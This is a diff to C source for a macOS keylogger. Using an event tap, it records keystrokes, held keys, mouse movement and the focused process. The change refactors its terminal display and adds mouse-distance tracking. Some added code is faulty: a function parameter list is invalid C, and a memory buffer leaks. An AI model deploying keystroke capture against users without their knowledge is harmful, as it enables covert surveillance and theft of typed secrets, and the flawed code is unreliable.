@@ -3,8 +3,8 @@
 #define DELETE_DATABASE_FILE    true
 #define LOG_TIME_ENABLED        false
 #define LOG_PATH_ENABLED        true
-#define WEBSERVER_ENABLED        true
-#define SQL_ENABLED        true
+#define WEBSERVER_ENABLED       true
+#define SQL_ENABLED             true
 /**********************************/
 #include "../include/keylogger.h"
 #include "../src/includes.c"
@@ -22,6 +22,37 @@ volatile unsigned int windows_qty = 0;
 #include "osx_utils.c"
 /**********************************/
 #include "webserver.c"
+/**********************************/
+volatile unsigned long
+  events_qty       = 0,
+  started          = 0,
+  mouse_events_qty = 0,
+  kb_events_qty    = 0
+;
+/**********************************/
+CGPoint mouse_location, previous_mouse_location;
+double  mouse_distance = 0;
+
+
+/**********************************/
+void get_mouse_distance(int px, py, cx, cy){
+  double dx = abs(cx - px);
+  double dy = abs(cy - py);
+  double d  = sqrt((dx * dx) + (dy * dy));
+
+  mouse_distance += d;
+  term_move_to(0, 0);
+  log_ok("mouse distance:   x:%.2lf|y:%.2lf -> %.2lf |    %.2lf                               ", dx, dy, d, mouse_distance);
+}
+
+
+/**********************************/
+char *mouse_distance_pixels_string(){
+  char *s = malloc(1024);
+
+  sprintf(s, "%.2lf", mouse_distance);
+  return(strdup(s));
+}
 
 
 /**********************************/
@@ -99,14 +130,6 @@ focused_t * get_focused_process(){
   return(f);
 }
 /**********************************/
-volatile unsigned long
-  events_qty       = 0,
-  started          = 0,
-  mouse_events_qty = 0,
-  kb_events_qty    = 0
-;
-CGPoint     mouse_location;
-/**********************************/
 CGEventMask mouse_and_kb_events = (
   ///////////////////////////////////////
   CGEventMaskBit(kCGEventKeyDown)
@@ -179,19 +202,30 @@ void init_sql(){
 
 /**********************************/
 void init(const int argc, const char **argv){
-  started          = timestamp();
+  started = timestamp();
   term_hide_cursor();
   log_set_level(MY_LOG_LEVEL);
   config_main(argc, argv);
-  if(SQL_ENABLED)
-      init_sql();
-  if(WEBSERVER_ENABLED)
-      webserver_thread();
+  if (SQL_ENABLED) {
+    init_sql();
+  }
+  if (WEBSERVER_ENABLED) {
+    webserver_thread();
+  }
   keystates        = list_new();
   downkeys         = list_new();
   downkeys_history = list_new();
-  mouse_location   = CGEventGetLocation(event_handler);
   sb               = stringbuffer_new_with_options(1024, true);
+}
+/**********************************/
+#define ITEM(TYPE, LABEL, VALUE)    {                            \
+    stringbuffer_append_string(sb, "\n");                        \
+    stringbuffer_append_string(sb, AC_RESETALL);                 \
+    stringbuffer_append_string(sb, LABEL ":");                   \
+    stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD); \
+    TYPE(sb, VALUE);                                             \
+    stringbuffer_append_string(sb, AC_RESETALL);                 \
+    stringbuffer_append_string(sb, "\t");                        \
 }
 /**********************************/
 
@@ -219,10 +253,15 @@ CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef 
     last_ts = ts;
   }
 
-  if(mouse_events_qty == 0 || is_mouse){
+  if (mouse_events_qty == 0 || is_mouse) {
     mouse_location = CGEventGetLocation(event);
   }
   if (is_mouse) {
+    if (mouse_events_qty > 0) {
+      get_mouse_distance(previous_mouse_location.x, previous_mouse_location.y, mouse_location.x, mouse_location.y);
+      previous_mouse_location.x = mouse_location.x;
+      previous_mouse_location.y = mouse_location.y;
+    }
     mouse_events_qty++;
   }else if (is_keyboard) {
     kb_events_qty++;
@@ -253,46 +292,30 @@ CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef 
   }
 
   int           handled = handle_key((const int)keyCode, (const char *)ckc);
-
   unsigned long runtime = timestamp() - started;
-
 
   stringbuffer_clear(sb);
 
-  stringbuffer_append_string(sb, AC_RESETALL "event type:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
-  stringbuffer_append_string(sb, "[");
-  stringbuffer_append_string(sb, is_mouse ? "Mouse" : "Keyboard");
-  stringbuffer_append_string(sb, "]\t  ");
-  stringbuffer_append_string(sb, "\n");
+  ITEM(stringbuffer_append_string, "Event Type", (is_mouse ? "Mouse" : "Keyboard"));
 
+  stringbuffer_append_string(sb, "\n");
   stringbuffer_append_string(sb, AC_RESETALL "log:");
   stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
   stringbuffer_append_string(sb, "[");
-  stringbuffer_append_string(sb, (const char *)logfileLocation);
+  stringbuffer_append_string(sb, (char *)logfileLocation);
   stringbuffer_append_string(sb, "|(" AC_RESETALL);
   stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_BLUE_BLACK AC_BOLD AC_UNDERLINE);
-  stringbuffer_append_string(sb, bytes_to_string(fsio_file_size(logfileLocation)));
+  stringbuffer_append_string(sb, bytes_to_string(fsio_file_size((char *)logfileLocation)));
   stringbuffer_append_string(sb, AC_RESETALL ")]\t  ");
-  stringbuffer_append_string(sb, "\n");
 
-  stringbuffer_append_string(sb, AC_RESETALL "Events:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
-  stringbuffer_append_string(sb, "[");
-  stringbuffer_append_int(sb, kb_events_qty);
-  stringbuffer_append_string(sb, " keyboard");
-  stringbuffer_append_string(sb, "|");
-  stringbuffer_append_int(sb, mouse_events_qty);
-  stringbuffer_append_string(sb, " mouse");
-  stringbuffer_append_string(sb, "|");
-  stringbuffer_append_int(sb, events_qty);
-  stringbuffer_append_string(sb, " total");
-  stringbuffer_append_string(sb, "]\t  ");
-  stringbuffer_append_string(sb, "\n");
+  ITEM(stringbuffer_append_int, "Keyboard Events", kb_events_qty);
+  ITEM(stringbuffer_append_int, "Mouse Events", mouse_events_qty);
+  ITEM(stringbuffer_append_int, "Events", events_qty);
 
   focused_t   *fp = get_focused_process();
   pid_stats_t *ps = get_pid_stats((int)fp->pid);
 
+  stringbuffer_append_string(sb, "\n");
   stringbuffer_append_string(sb, AC_RESETALL "focused:");
   stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
   stringbuffer_append_string(sb, "[");
@@ -338,13 +361,6 @@ CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef 
   stringbuffer_append_string(sb, "]\t  ");
   stringbuffer_append_string(sb, "\n");
 
-  stringbuffer_append_string(sb, AC_RESETALL "handled:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
-  stringbuffer_append_string(sb, "[");
-  stringbuffer_append_int(sb, handled);
-  stringbuffer_append_string(sb, "]\t  ");
-  stringbuffer_append_string(sb, "\n");
-
   stringbuffer_append_string(sb, AC_RESETALL "last_ms:");
   stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
   stringbuffer_append_string(sb, "[");
@@ -354,76 +370,17 @@ CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef 
   stringbuffer_append_unsigned_long(sb, (ts - last_ts));
   stringbuffer_append_string(sb, "]\t  ");
 
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "type:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
-  stringbuffer_append_string(sb, "[");
-  stringbuffer_append_int(sb, type);
-  stringbuffer_append_string(sb, "]\t");
-  stringbuffer_append_string(sb, AC_RESETALL);
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "windows:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
-  stringbuffer_append_int(sb, windows_qty);
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "action:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
-  stringbuffer_append_string(sb, (char *)action);
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, "code:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
-  stringbuffer_append_string(sb, "[");
-  stringbuffer_append_int(sb, keyCode);
-  stringbuffer_append_string(sb, "]\t");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "key:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
-  stringbuffer_append_string(sb, (char *)ckc);
-  stringbuffer_append_string(sb, "\t  ");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "keys:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_YELLOW AC_BOLD);
-  stringbuffer_append_string(sb, get_key_with_downkeys((char *)ckc));
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t  ");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "down?:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
-  stringbuffer_append_string(sb, (char *)keycode_is_down_str((char *)ckc));
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "down qty:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
-  stringbuffer_append_int(sb, (int)down_keycodes_qty());
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t");
-
-  stringbuffer_append_string(sb, "\n");
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "down keys:");
-  stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD);
-  stringbuffer_append_string(sb, (char *)get_downkeys_strs());
-  stringbuffer_append_string(sb, AC_RESETALL);
-  stringbuffer_append_string(sb, "\t");
+  ITEM(stringbuffer_append_string, "Action", (char *)action);
+  ITEM(stringbuffer_append_int, "Handled", handled);
+  ITEM(stringbuffer_append_int, "Type", type);
+  ITEM(stringbuffer_append_int, "Windows Qty", windows_qty);
+  ITEM(stringbuffer_append_int, "Code", keyCode);
+  ITEM(stringbuffer_append_string, "Key", (char *)ckc);
+  ITEM(stringbuffer_append_string, "Keys", (char *)get_key_with_downkeys((char *)ckc));
+  ITEM(stringbuffer_append_string, "Down Keys", (char *)get_downkeys_strs());
+  ITEM(stringbuffer_append_int, "Down Qty", down_keycodes_qty());
+  ITEM(stringbuffer_append_int, "Uptime", getUptime());
+  ITEM(stringbuffer_append_string, "Mouse Pixels Distance", mouse_distance_pixels_string());
 
   if (false) {
     stringbuffer_append_string(sb, keyCode_dur);
